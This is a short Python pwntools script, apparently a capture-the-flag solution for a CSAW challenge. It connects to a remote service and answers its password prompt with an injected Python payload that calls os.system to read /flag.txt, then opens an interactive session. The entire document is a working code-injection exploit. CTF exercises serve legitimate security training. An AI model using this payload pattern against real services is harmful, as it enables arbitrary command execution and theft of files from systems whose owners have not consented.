from pwn import *


target = connect('intro.csaw.io', 31137)

target.sendlineafter(b"What's the password?", b'__import__("os").system("cat /flag.txt")')

target.interactive()

